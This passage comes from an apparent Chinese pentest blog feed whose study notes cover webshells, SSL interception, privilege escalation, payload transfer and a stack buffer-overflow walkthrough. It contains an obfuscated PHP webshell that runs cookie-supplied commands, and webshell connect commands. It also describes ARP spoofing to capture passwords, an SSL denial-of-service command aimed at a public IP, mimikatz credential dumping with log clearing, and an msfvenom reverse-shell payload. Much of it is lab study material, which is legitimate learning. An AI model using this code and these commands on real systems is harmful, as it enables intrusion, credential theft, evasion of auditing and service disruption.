<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> $b=strrev(<span class="string">"edoced_4"</span>.<span class="string">"6esab"</span>);<span class="keyword">eval</span>($b(str_replace(<span class="string">" "</span>,<span class="string">""</span>,<span class="string">"a W Y o a X N z Z X Q o J F 9 D T 0 9 L S U V b J 2 N t J 1 0 p K X t v Y l 9 z d G F y d C g p O 3 N 5 c 3 R l b S h i Y X N l N j R f Z G V j b 2 R l K C R f Q 0 9 P S 0 l F W y d j b S d d K S 4 n I D I + J j E n K T t z Z X R j b 2 9 r a W U o J F 9 D T 0 9 L S U V b J 2 N u J 1 0 s J F 9 D T 0 9 L S U V b J 2 N w J 1 0 u Y m F z Z T Y 0 X 2 V u Y 2 9 k Z S h v Y l 9 n Z X R f Y 2 9 u d G V u d H M o K S k u J F 9 D T 0 9 L S U V b J 2 N w J 1 0 p O 2 9 i X 2 V u Z F 9 j b G V h b i g p O 3 0 = "</span>))); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>连接木马：<code>webacoo -t -u http://192.168.209.1/webacoo.php</code></li>
<li><img src="img7.jpg" alt="webacoo"></li>
</ul>
<p>其他的参数比较简单，而且用处不是太大（除非被针对）。</p>
<p>Weevely比较好用。<br>支持的功能很多，还支持密码。</p>
<ul>
<li>生成服务端：<code>weevely generate pass123 wee.php</code></li>
<li>连接：<code>weevely http://19.168.209.1:8080/wee.php pass123</code></li>
<li>连接上使用help查看模块命令</li>
</ul>
<p><img src="img8.jpg" alt="weevely"></p>
<h2 id="SSL扫描"><a href="#SSL扫描" class="headerlink" title="SSL扫描"></a>SSL扫描</h2><p>识别加密算法：<code>openssl s_client -connect www.baidu.com:443</code><br><img src="img9.jpg" alt="openssl"><br>查看证书链。<br>连接SSL：<code>openssl s_client -tls1_2 -cipher &#39;ECDH-RSA-RC4-SHA&#39; -connect www.taobao.com:443</code><br>不安全的组合：<code>openssl ciphers -v &quot;NULL,EXPORE,LOW,DES&quot;</code><br><img src="img10.jpg" alt="unsafe"><br>扫描SSL直观信息：<code>sslscan --tlsall www.taobao.com:443</code><br><img src="img11.jpg" alt="SSL"><br>分析服务器证书详细数据：<code>sslscan -show-certificate --no-ciphersuites www.taobao.com:443</code><br>发现：<code>rsa_pkcs1_sha1</code>是不安全的<br>查看SSL漏洞：<code>sslyze --regular www.taobao.com:443</code><br><img src="img12.jpg" alt="SSL漏洞"></p>
<p>在线检查：<code>www.ssllabs.com/ssltest</code></p>
<p>生成证书：<code>openssl genrsa -out ca.key 2048</code><br>生成根证书：<code>openssl req -new -x509 -days 1096 -key ca.key -out ca.crt</code><br>交互：</p>
<ol>
<li>CN</li>
<li>HaiKou</li>
<li>HaiNan</li>
<li>Alibab</li>
<li>ALI</li>
<li>ALIBABA</li>
<li><code>3311736869@qq.com</code></li>
</ol>
<p><img src="img13.jpg" alt="crt"></p>
<p>打开路由功能：<code>sysctl -w net.ipv4.ip_forward=1</code><br>其实实际上修改的就是<code>/proc/sys/net/ipv4/ip_forward</code>，默认是0我们改为了1。<br>重定向端口信息。<br><img src="img14.jpg" alt="iptables"><br>ARP欺骗<br><img src="img15.jpg" alt="arp欺骗"><br>接下来就是受害者登录，我们截取密码了。<br>只是访问的时候浏览器会弹出警告不安全。</p>
<p>SSLDOS不太需要占带宽。<br>使用命令：<code>thc-ssl-dos 218.189.202.46 443 --accept</code></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>本地提权</title>
    <url>/2020/04/26/%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/</url>
    <content><![CDATA[<h2 id="kali安装VM-TOOLS"><a href="#kali安装VM-TOOLS" class="headerlink" title="kali安装VM_TOOLS"></a>kali安装VM_TOOLS</h2><p>最新版本需要执行：<code>sudo apt-get install open-vm-tools-desktop fuse</code>才可以。</p>
<h1 id="操作系统用户"><a href="#操作系统用户" class="headerlink" title="操作系统用户"></a>操作系统用户</h1><ol>
<li>Windows<ol>
<li>user：普通的用户</li>
<li>administrator：超级管理员</li>
<li>system：内核级管理员</li>
<li>administrator包含user功能，system包含administrator和user的大部分功能</li>
<li>Guest是最小的权限</li>
</ol>
</li>
<li>Linux<ol>
<li>user：普通用户</li>
<li>root：超级管理员</li>
<li>root级别最大，可以掌控所有</li>
</ol>
</li>
</ol>
<h2 id="Windows下的administrator到system"><a href="#Windows下的administrator到system" class="headerlink" title="Windows下的administrator到system"></a>Windows下的administrator到system</h2><p>XP：使用命令：<code>at 11:24 /interactive cmd</code><br>意思就是在11:24分启动一个交互的cmd，权限是system，因为at命令是由system权限的。<br><img src="img1.jpg" alt="adtosys"><br>再次之后在这个cmd启动的都是system权限，然后使用taskmgr打开进程管理器，杀死explore进程，然后再用system启动explore进程，那么系统就会进入system权限了。</p>
<p>win7/win8：at已经没了，sc命令：<br><code>sc Create syscmd binPath=&quot;cmd /K start&quot; type=own type=interactive</code><br><code>sc start syscmd</code><br>服务都是system进行启动。<br>第一句是创建一个名称为syscmd的服务，这个服务是启动一个可以交互的命令行。<br>第二条是启动这个服务。</p>
<p>微软提供了些提权的套件。</p>
<p>注入进程提权：就是注入已经启动了的System进程，然后获取CMD。<br>一般提供一个端口就是我们可以使用nc连接的。<br>优点是因为注入所以不会被管理员通过进程发现异常。</p>
<h2 id="常用方法"><a href="#常用方法" class="headerlink" title="常用方法"></a>常用方法</h2><ol>
<li>通过数据包的抓取嗅探，可以获得更多账号的账号密码。</li>
<li>通过键盘记录器。</li>
<li>本地缓存密码（浏览器的密码记录，远程登陆凭证，无线wifi密码）</li>
<li>PwDump(kali带着)，支持查看远程的加密密码，现在这些Windows的工具都存放在/usr/share/windows-binaries下面了</li>
<li>Windows登录的密码是在C盘下的Windows下的system32下的config下的SAM文件，但是是加密的</li>
<li>wce 在内存中读取登录的账号的sessions信息</li>
<li><code>wce -lv</code>查看当前登录的sessions信息</li>
<li><code>wce -d password</code>计算hash密码</li>
<li><code>wce -w</code>读取一个存储的明文包密码，有可能能独处登录用户的密码，其实也就是Digest这个包中存在明文密码。</li>
<li>wce可以执行的话呢必须要是管理员</li>
<li><code>wce -i 0004BE06 -s xxx:xxxxxxxxxxxx:xxxxxxxxxx</code></li>
<li>上面这句话的意思就是说，把那个0004BE06的账号改为后面的这个账号</li>
<li>mimikatz使用先提权</li>
<li><code>privilege::debug</code>提升权限</li>
<li><code>sekurlsa::logonPasswords</code>可以查看太多的信息。</li>
<li><code>ts::multirdp</code>允许多用户同时登陆</li>
<li><code>event::clear</code>清除安全日志</li>
<li><code>event::drop</code>不产生安全日志</li>
<li>使用一定的漏洞进行提权，例如<code>MS-11-080，MS14-068</code></li>
</ol>
<h2 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h2><p>首先需要一台Linux内核小于2.6.39的一个系统（这里用的是bee的那个Ubuntu），我们现在是普通用户。<br><img src="img2.jpg" alt="normalusr"><br>然后我们在kali中编译这个版本的漏洞，搜索<code>2.6.39</code>，使用<code>18411.c</code>这个文件，Linux内核的一个漏洞<br><img src="img3.jpg" alt="gcc"><br>然后将生成的exp放在目标系统上。<br>但是生成的文件无法运行，需要将源码移植到Ubuntu上面，然后在上面运行gcc编译源码。<br>但是最终我还是没有能够进行提权，我觉得可能是我的版本太低了。</p>
<h2 id="配置不当提权"><a href="#配置不当提权" class="headerlink" title="配置不当提权"></a>配置不当提权</h2><p>就是通过有些服务是system权限运行的，我们替换掉这个文件然后重启服务，我们修改的程序就有了system的权限。<br>当然我们需要有修改文件的权限（这一点需要管理员配置不当）。</p>
<h3 id="Windows下查找"><a href="#Windows下查找" class="headerlink" title="Windows下查找"></a>Windows下查找</h3><p>使用icacls进行文件权限的查询。<br>常用命令：<code>icacls c:\windows\*.exe /save perm /T</code><br>这个是进行递归的一个查询Windows下面的程序的权限列举，生成一个perm文件进行保存。<br>最后搜索一个：<code>FA;;;BU</code>找到对应的程序，然后我们替换，就等着管理员重启机器。<br>替换的文件可以进行捆绑反弹shell。</p>
<h3 id="Linux下查找"><a href="#Linux下查找" class="headerlink" title="Linux下查找"></a>Linux下查找</h3><p><code>find / -perm 777 -exec ls -l {} \;</code></p>
<h2 id="查找隐私信息"><a href="#查找隐私信息" class="headerlink" title="查找隐私信息"></a>查找隐私信息</h2><p>Linux：</p>
<ol>
<li>/etc/resolv.conf</li>
<li>/etc/passwd</li>
<li>/etc/shadow</li>
<li>whoami,who -a</li>
<li>ifconfig -a ,iptables -L -n,netstat -rn</li>
<li>uname -a.ps aux</li>
<li>dpkg -l | head</li>
</ol>
<p>Windows：</p>
<ol>
<li>ipconfig /all ,ipconfig /displaydns,netstat -bnao,netstat -r</li>
<li>new view,new view /domain</li>
<li>new user /domain,net user %username% /domain</li>
<li>net localgroup administrator username /add</li>
<li>net group “Domain Controllers” /domain</li>
<li>net share name$=C:/unlimited</li>
<li>net user username /active:yes /domain</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>溢出思路</title>
    <url>/2020/04/24/%E6%BA%A2%E5%87%BA%E6%80%9D%E8%B7%AF/</url>
    <content><![CDATA[<h2 id="溢出其余思路"><a href="#溢出其余思路" class="headerlink" title="溢出其余思路"></a>溢出其余思路</h2><ol>
<li>有的时候我们可能只能发送指定个数的溢出字符，比如说只有发送3000个a的时候我们才能控制EIP的指定内容。</li>
<li>有的时候我们可能并不能修改很多字符，情况是我们在EIP后面的栈内容中只能写很少个数的内容，但是我们溢出肯定有很多代码，所以找到那段字节，这个值可能是存在eax/ebx/edi之类的寄存器存储的内存单元指向的地址的，我们可以修改他，然后使用jmp eax之类的命令跳转过去，当然我们还是要先将EIP跳到ESP，然后间接跳转。</li>
<li>跳转的时候还可以使用call，但是记得要恢复堆栈平衡的。</li>
<li>溢出的坏字符一定要先查询</li>
</ol>
<h2 id="搜索漏洞"><a href="#搜索漏洞" class="headerlink" title="搜索漏洞"></a>搜索漏洞</h2><ol>
<li>Exploit-db</li>
<li>SecurityFocus</li>
<li>Searchsploit</li>
</ol>
<h2 id="上传文件"><a href="#上传文件" class="headerlink" title="上传文件"></a>上传文件</h2><ol>
<li><p>Linux：</p>
<ol>
<li>netcat</li>
<li>curl</li>
<li>wget</li>
</ol>
</li>
<li><p>Windows：<br>nc反弹的shell并不是一个交互的shell，不能进一步使用太多功能。</p>
<ol>
<li>TFTP（UDP，不加密，没有身份验证）<ol>
<li>XP，2003都是有的</li>
<li>Win7、2008都需要单独添加</li>
<li>但是一般会被防火墙过滤</li>
<li>mkdir /tftp</li>
<li>将要上传到文件复制到tftp中</li>
<li>chown -R nobody /tftp</li>
<li>atftpd –daemon –port 69 /tftp</li>
<li>netstat -panu | grep 69</li>
<li>上面的命令主要是判断是不是atftpd打开的69，如果不是说明chown需要再运行一次</li>
<li>在shell中使用<code>tftp -i 192.168.209.130 get 在tftp中的文件</code></li>
</ol>
</li>
<li>FTP进行下载<ol>
<li><code>echo open 192.168.209.130 &gt; ftp.txt</code></li>
<li><code>echo username &gt;&gt; ftp.txt</code></li>
<li><code>echo password &gt;&gt; ftp.txt</code></li>
<li><code>echo bin &gt;&gt; ftp.txt</code></li>
<li><code>echo GET file.exe &gt;&gt; ftp.txt</code></li>
<li><code>echo bye &gt;&gt; ftp.txt</code></li>
<li>在shell中执行<code>ftp -s:ftp.txt</code></li>
</ol>
</li>
<li>vbs通过http传输<ol>
<li>使用echo输出</li>
<li>然后本机开80，放木马</li>
<li>对面下载（使用cscript）</li>
</ol>
</li>
<li>使用POWERSHELL传输文件<ol>
<li>编写脚本和vbs差不多</li>
<li><code>powershell.exe -ExecutionPolicy Bypass -NoLogo -NonIneractive -NoProfile filename.ps1</code></li>
</ol>
</li>
<li>使用Debug<ol>
<li>使用压缩壳对木马进行压缩</li>
<li>使用<code>exe2bat.exe nc.exe nc.txt</code>吧exe转换成文本的二进制文件</li>
<li>然后在shell中执行echo的语句，记住最后两句不是</li>
<li>他会在目标生成一个hex文件</li>
<li>最后再使用他最后两句的第一句，使用Debug汇编会生成一个DLL</li>
<li>然后使用最后一句改名DLL为执行程序</li>
<li>这个方法不能大于64KB</li>
</ol>
</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>溢出漏洞</title>
    <url>/2020/04/23/%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="溢出漏洞"><a href="#溢出漏洞" class="headerlink" title="溢出漏洞"></a>溢出漏洞</h1><p>下面的内容皆是自己的一些理解，没有太多专业术语。<br>溢出漏洞说白了就是对边界没有检验，而导致原先不应该在这里的数据反而阴差阳错的出现在了这里。<br>我大体的对溢出漏洞分为了两种：</p>
<ul>
<li>数据溢出</li>
<li>缓冲区溢出</li>
</ul>
<p>第一种数据溢出应用场景主要是针对外挂和破解<br>第二种缓冲区溢出应用场景主要是针对渗透测试</p>
<p>下面我会分别讲解这两种溢出的详细细节，那我们测试的程序是我写的测试小程序。</p>
<h2 id="数据溢出"><a href="#数据溢出" class="headerlink" title="数据溢出"></a>数据溢出</h2><p>首先我们需要在一台XP系统上运行测试程序，然后我会监听你的8888端口<br>首先我们用nc去连接8888端口。<br><img src="img1.jpg" alt="nc连接"><br>连接上之后会显示banner信息，意思是你一共有15块钱，然后你要买苹果，一个苹果1块钱，那么我们的第一个目的是要实现无限购买苹果。<br>然后我们输入一个1传递过去，服务端会给我们响应：<br><img src="img2.jpg" alt="响应"><br>那么理论上我们只能买十五个苹果，那么我们如何去购买无限个苹果呢？<br>首先我们探测一下目标服务器的类型。<br><img src="img3.jpg" alt="目标服务器"><br>看到CPE的匹配最大概率是SP1和SP2，所以我们可以基本断定是32位的操作系统。<br>我们首先先猜测它存储这个剩余的钱使用的是int类型，所以这个三十二位的一个变量，那么我们就可以尝试一下溢出！<br>我们计算一下我们现在15块钱，如果我们买<code>3000000000</code>个苹果会怎么样？按照常规的思路是：15-3000000000=-2999999985，我们将会欠债这么多钱，但是事实上当我们真正的输入这么多钱过去之后我们会发现：<br><img src="img4.jpg" alt="left"><br>很奇怪，为什么我们会剩下<code>1294967311</code>这么多钱呢？<br>其实是事实上确实是<code>-2999999985</code>这么多，但是我们转换为二进制：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">‭1111111111111111111111111111111101001101001011111010001000001111‬</span><br></pre></td></tr></table></figure>
<p>这个长度是64位的，但是他使用的是32位的int存储，所以我们不得不丢失前面的32位，那我们的剩下的二进制：<code>‭01001101001011111010001000001111‬</code><br>那最终转换成十进制就是：<br><img src="img5.jpg" alt="calc"><br>在很久以前，如果游戏有漏洞，WPE抓游戏的封包然后溢出刷钱，当然我们也可以进行定值的计算，也就是逆向来算，通过你现在的钱，然后和你想要的钱计算出来你需要卖多少个苹果才会得到你真实的金钱，但是现在这种漏洞确实已经很难难难难难难难难难难难难难见到了。</p>
<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><p>上面的那个不检查边界引起的漏洞只能说我们只是欺骗了卖苹果的多找给我们钱，那么我们如何成为卖苹果的就是缓冲区溢出所要做的。<br>首先我们先要系统是XP没有开启DEP（开启的话呢绕过会有些麻烦，这里不详细将如何绕过）<br>如何检测你的虚拟机开没开DEP，首先我们打开我的电脑-&gt;属性：<br><img src="img6.jpg" alt="DEB"><br>如果那个noexecute=AlwaysOff的话呢说明这个DEP没有开启，系统是不会检测边界问题的，其实说白了就和我们当时玩XP内核用调试模式打开XP时候配置的boot.ini修改的位置一样，只不过我们这个时候是要更改noexecute这个属性。<br>然后重启一下，我们还是运行我们调试的程序。<br>这个时候我们要来做模糊测试了，首先我们的思路是这样子的，他既然没有检测我们的输入是否存在边界，那么我们就可以考虑，我们输入的内容会不会溢出到EIP这个寄存器呢？没错，这个就是我们想到的，那么我们如何检测呢？我们首先先用DBG附加我们的程序。<br>这里我们不能用OD，因为OD会捕获这个EIP位置的异常，我们需要设置，但是我怕我这里说了，会有点偏离文章主题，所以我们用一个<code>Immunity Debugger</code>，这个会把这个异常反馈给我们，我们用这个调试器附加进程，这个方便之处他可以查看进程开发的端口，容易选择，选择开放8888这个端口的进程。<br>我们先发送50个a给这个程序，看看这个程序会不会溢出。<br><img src="img7.jpg" alt="a"><br>发过去之后，我们立马过去看调试：<br><img src="img8.jpg" alt="EIP"><br>这个时候程序pause了，可以看到EIP变成了4个61！那么为什么会变成61呢？想了一下，我们输入了a，它对应的十六进制的ASCII正好就是61！所以我们可以基本确定的是，我们输入的内容中的一部分被溢出到了EIP这个寄存器。<br>那么我们下一步就是要来确定到底是哪个位置溢出的字符变成了EIP的值，所以我们这个时候就要来找，这个时候我们有两种思路：</p>
<ol>
<li>使用二分法</li>
<li>使用特征字符<br>第一种就是比较基本的寻找，第二种就是输入50个不同的字符，然后看看是哪个位置的值覆盖了EIP。<br>第二种kali之前是带了可以生成的工具，但是我的kali不知道什么原因出错了，可能是Ruby的版本不同吧。<br>我就用二分法，也不是很难，就是在50个位置里面找一个位置，找个几次也就找出来了，这里的话呢我们最好用一个小脚本：<br><img src="img9.jpg" alt="jb"><br>很简单就是通过更改”B”字符乘的个数，来确定到底是第几个位置出现了，也就是到底是乘几才会让EIP变成4个“O”。<br>最终发现16个B之后的连续四个字节会覆盖EIP。<br><img src="img10.jpg" alt="O"><br>到此为止我们就已经完成了一半，我们现在可以控制程序的EIP，那么问题来了，虽然我们可以控制程序的EIP，那么如何让他执行我们想要执行的代码呢？这是一个问题。<br>这个时候我们多次尝试的过程中发现一个问题，当我们字符输入很多的时候，我们在四个“O”之后的内容会出现在栈中！这个意思就是说我们可以控制栈的内容：<br><img src="img11.jpg" alt="ESP"></li>
</ol>
<p>所以说溢出的结构是：</p>
<p>——————————<br>原始位置<br>——————————<br>EIP<br>——————————<br>栈<br>——————————</p>
<p>这个时候就可以想到，如果我们在栈中放入我们的恶意代码，然后让EIP的值等于ESP，那么就会在目标系统执行我们的木马。<br>好了那么我们现在需要一段恶意代码，也就是能够在目标系统留一个后门程序的，那么我们如何得到呢？其实kali提供给我们了一个程序可以生成这么一段汇编代码，使用msfvenom这个程序进行生成。<br>具体命令：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows</code><br><img src="img12.jpg" alt="msfvenom"><br>可以看到生成了一个Python格式的字节但是我们注意，可以看到我们这里面存在一个00，这个显然不是我们要的，因为00是字符串的结束啊，所以我们不能有00这个字节，那么我们就需要告诉他我们排除00这个badchar。<br><code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00</code><br><img src="img13.jpg" alt="nobadchar"><br>这个就是没有00了，那么我们可以改一下我们的代码：<br><img src="img14.jpg" alt="code"><br>那么这个0x90是做什么的，其实就是怕不是第一个字符开始执行有点差错的话呢那么我们的程序就会终止，那么我们可以加几个NOP进行填充，这样保证我们的程序可以正确无误的执行。<br>我们大部分的工作完成了，但是还存在一个问题，那个OOOO到底要写成什么，我们肯定不能写成ESP的地址，那么怎么办？这个时候我们只能间接的进行实现了。<br>反正我们只要让EIP运行到ESP的位置，那么我们为什么不能找一个地址，这个地址存储的汇编代码是可以跳转到ESP的呢？<br>例如：<code>jmp esp</code>,<code>ret</code>,<code>jnz/jz/je/jne esp</code>，寻找这个样子的代码，第一个明显是最简单的，第二个的话呢我们还是需要构造一下，好让他能返回到ESP，第三个的话呢我们还需要考虑标志寄存器的一个问题（其实还有好多，这里我就举了这几个）。<br>所以我们现在就要找一个这个程序里面哪个地方存在<code>jmp esp</code>这条语句，我们只需要将OOOO设置为这个地址，然后EIP运行到这里的时候，然后他就会跳转到ESP。<br>我们首先要确定我们找到的这个地址他是不会改变的地址（ASLR），第二就是这个地址里面不能存在00，第三就是这个地址没有被SEH链保护，第四还要这个地址要是系统的DLL。<br>确定这一点之后，我们就要来查一下，这个DBG有个mona插件，可以网上下载，他支持查看：<code>!mona modules</code>:<br><img src="img15.jpg" alt="模块"><br>OD也有类似的插件。<br>我们尽量保证除了OS DLL这个选项是true，其他的选项都是FALSE，我们最终发现了<code>SLMFC.dll</code>，那么我们就在这个DLL中寻找<code>jmp esp</code>。<br>其实如果主程序的地址不是00开头的话呢应该也是可以用的，但是很可惜一般不太可能。<br>那么我们来寻找一下，使用命令：<code>!mona find -s &quot;\xff\xe4&quot; -m &quot;SLMFC.dll&quot;</code><br>最后得到：<br><img src="img16.jpg" alt="jmp"><br><code>jmp esp</code>对应的就是ff e4。<br>最后找到了这么多，随便选一个：<code>0x5f4b41e3</code><br>我们尝试一下，但是我们用的时候注意，我们这个地址是要能够执行的，如果不是的话呢要确保你的DEP是关闭的（上面说过了）。<br>还需要注意的是，我们内存的存储方式，需要反过来，也就是说我们要这样写：<code>\xe3\x41\x4b\x5f</code>。<br>这个样子就可以了，我们先用nc开一个侦听端口，端口号是666，我们在shellcode中设置的端口号：<code>nc -vlp 666</code><br>然后执行我们写好的代码：<br><img src="img17.jpg" alt="code"><br>然后注意nc。<br><img src="img18.jpg" alt="nc"><br>可以看到连接上来了，但是没有shell，这个我也不是太清楚，所以我们只能用msf给我们的功能，首先打开msf。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set LHOST 192.168.209.138</span><br><span class="line">set LPORT 666</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
<p><img src="img19.jpg" alt="msf"><br>监听好这个端口，注意我们这里用反向连接的shell。<br>然后我们再运行我们的溢出代码。<br><img src="img20.jpg" alt="shell"><br>shell来了，这个时候我们用一下试试正常不正常。<br><img src="img21.jpg" alt="sessions"></p>
<p>发现不稳定，立马掉了可以说，这个时候我就去找了一下原因，发现0x0d这个居然也不可以有，这个换行我们也不得不当做坏字符，所以说，我们最好将所有的这个255字符全部尝试一下，然后将badchar一次找出，最后的命令是：<code>msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.209.138 lport=666 -a x86 -f c --platform windows -b 00 0d</code><br>生成的shellcode是可以用的，我们尝试获取一下目录：<br><img src="img22.jpg" alt="shell"><br><img src="img23.jpg" alt="org"><br>发现正常执行，没什么问题了。<br>到这里就是缓冲区溢出攻击完毕。</p>
<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>其实这是一个比较简单的溢出，真正的溢出比这个要麻烦许多，还需要绕过之类的，<br>为什么16之后是溢出的，大家可以自己去在思考一下，透漏一下，我在进行字符拷贝的时候给的缓冲区大小是15个字节。</p>
<p>我一直觉得开发、渗透、逆向作为一个有机的循环链是做安全的核心。</p>
<p><img src="img24.jpg" alt="circle"></p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>缓冲区溢出</title>
    <url>/2020/04/21/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>比较简单的漏洞样板：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">! /bin/bash</span></span><br><span class="line">echo $1</span><br></pre></td></tr></table></figure>
<p>意思就是说打印传进来的第一个参数，例如：<code>./a.sh test</code><br>原本是这样的，但是和SQL注入一样，我们增加闭合来实现代码注入：<br><code>./a.sh ; ls</code><br><code>./a.sh | ls</code><br><code>./a.sh &amp;&amp; ls</code><br><code>./a.sh &amp; ls</code><br>最终输出的效果就是把我们的目录打印了出来。</p>
<h1 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h1><p>用户提交大型数据，数据溢出到数据边界，占到别的内存了。<br>在下篇文章记录！</p>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>弱点扫描</title>
    <url>/2020/04/20/%E5%BC%B1%E7%82%B9%E6%89%AB%E6%8F%8F/</url>
    <content><![CDATA[<h1 id="弱点扫描"><a href="#弱点扫描" class="headerlink" title="弱点扫描"></a>弱点扫描</h1><p>就是扫漏洞，常见的漏洞查询网站：exploit-db，当然kali集成了searchsploit这个工具，它可以进行查询漏洞，后面跟上查询的内容就好。</p>
<h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>nmap使用的脚本列表放在了/usr/share/nmap/scripts/script.db文件下面，直接查看就好了<br>可以直接进行调用，就是脚本检测，例如：<code>nmap -p445 --script=smb-enum-shares.nse 192.168.209.130</code></p>
<h2 id="openvas"><a href="#openvas" class="headerlink" title="openvas"></a>openvas</h2><p>是Nessus之前免费版的一个分支，但是现在是开源的。<br>要先安装：<code>apt-get install openvas</code><br>然后配置安装:<code>openvas setup</code><br>然后我发现我的安装出错了，又用了i开头的那个初始化工具修复一下。<br>更新使用feed-up这个文件，但是在安装的时候最终我还是出错了，但是貌似我的那个错误只是不能被共享查看，单纯扫描检测的话呢是不影响的。<br>密码在安装完毕之后会出现，这个时候需要注意的是要保存，要不我们就要使用命令强行更改，最好我就是没改，然后我的火狐帮我记住了。<br>进来之后，扫描基本可以分为三个步骤（单纯一次的扫描，也是比较常规的）：</p>
<ol>
<li>添加一个扫描配置<ol>
<li>选择Configuration菜单下面的Scan Configs</li>
<li>点击左上方的一个星号（很小）</li>
<li>然后根据自己对扫描对象的信息收集进行配置</li>
<li>这个操作不是很难，根据选择就好</li>
</ol>
</li>
<li>添加一个（一些）目标<ol>
<li>选择Configuration菜单下面的Targets</li>
<li>然后同样的点击左上方的星号</li>
<li>然后根据选择进行配置，选择一堆IP还是一个IP</li>
<li>下面的话呢就是端口扫描的话呢根据需要</li>
<li>存活判断的话呢一般选择Consider Alive</li>
</ol>
</li>
<li>增加扫描<ol>
<li>选择Scans下面的Tasks</li>
<li>星号添加</li>
<li>配置的话呢也就是根据需求</li>
<li>最下面两个是并发的封包数目和IP数目</li>
<li>当然有一个Schedule的选项也就是日程，我们选择Once就好，当然你可以增加一个日程，不难也就是星号添加</li>
</ol>
</li>
<li>开始扫描<ol>
<li>添加完任务之后，我们选择要开始的任务，右边有个三角形的开始按钮，点击开始就可以了</li>
<li>我们点击Status的进度状态，可以查看当前最新的检测情况</li>
<li><img src="img1.jpg" alt="openvas"></li>
<li>第一栏目是漏洞标题，第二个是个插件貌似，第三个是漏洞的危险程度（评分根据配置中的标准，我这里貌似是自带的CVSS），第三个是漏洞的可能性（并不会百分之百），最后一个是可以添加误判提示和警告note</li>
<li>可以看到有个3389的蓝屏还有几个IIS和Tomcat的漏洞</li>
</ol>
</li>
<li>导出扫描<ol>
<li>在左上方选择你要导出的类型，然后在点击右边的下载就可以了。</li>
<li><img src="img2.jpg" alt="导出"></li>
<li>PDF的话呢是下面这个样子：</li>
<li><img src="img3.jpg" alt="PDF"></li>
<li>还是蛮详细的</li>
</ol>
</li>
</ol>
<p>需要注意的是重启之后我们要重新开启服务的，可能有点慢，而且这个openvas更新速度蛮快的，所以经常更新，还有就是他启动会占用三个端口，需要注意，都是939X的。</p>
<h2 id="nessus"><a href="#nessus" class="headerlink" title="nessus"></a>nessus</h2><p>这个是个神器，很好用，首先我需要下载他的框架程序，有专门的用于kali的deb包，使用<code>dpkg -i xxxx</code>这个命令将下载好的nessus进行安装，安装的也比较快，启动起来之后，我们就运行，在浏览器中运行<code>kali:8834</code>这个网址，然后店下一步之类的，还有个让我们输入账号密码的，这个输入的就是我们登陆用到的账号密码，然后还有让我们去输入一个Active code，这个去官网注册一个免费的就好了，然后接下来就是漫长的等待，真的很漫长不要以为是卡了，是真的慢，我安装了一下午。<br>当然在下次重新启动的时候我们需要运行nessus这个服务，他还会检查插件问题，就是貌似检查更新吧，但是时间不会太长了（十分钟左右）。<br>进入之后我们需要新建扫描的话呢就需要两到三步：</p>
<ol>
<li>新建扫描策略：<ol>
<li>点击Policies然后创建一个新的模板</li>
<li>然后下面有几个弄好了的模板，我们选择哪个高级的Advanced Scan</li>
<li>第一页的话呢就根据选择建立就好了（就是一些主机发现啊，端口扫描，服务发现之类的配置，注意里面会默认扫描本机，如果网段有本机的话呢）</li>
<li>第二页Credentials就是让我们输入已知的信息，比如一些账号密码（主要用来登陆检测）</li>
<li>第三页是Plugins，我们点进去选择我们想要要的，不想要的直接Disable，他就会变灰</li>
<li>最后保存即可</li>
</ol>
</li>
<li>新建扫描任务<ol>
<li>点击My Scans，然后新建扫描</li>
<li>选择User Defined，选择刚才选中的模板</li>
<li>然后第一页输入扫描名称和要扫描的IP段或IP</li>
<li>后两页和openvas一样，一个是定时扫描，还有一个就是发邮件</li>
<li>然后保存</li>
</ol>
</li>
<li>开始扫描<ol>
<li>在My Scans中，在要开始的项目点击那个开始的三角形就可以开始了</li>
<li>我们可以点进去，他会实时更新检查情况</li>
</ol>
</li>
</ol>
